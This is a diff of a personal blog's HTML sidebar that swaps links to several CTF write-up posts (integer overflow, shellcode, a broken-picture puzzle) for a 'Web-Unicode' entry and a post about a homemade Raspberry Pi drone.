+        <a href="/2023/09/07/dgctf2/" ><i class="fa fa-file-o"></i>Web-Unicode</a>
       </li>
     
       <li>
-        <a href="/2023/10/03/pwnintof/" ><i class="fa fa-file-o"></i>PWN-Int Overflow</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/03/miscpic/" ><i class="fa fa-file-o"></i>Misc-bronken picture_1</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/02/pwnshell0/" ><i class="fa fa-file-o"></i>PWN-shellcode_level0</a>
+        <a href="/2023/09/01/drone/" ><i class="fa fa-file-o"></i>自制树莓派无人机</a>
       </li>
     
   </ul>
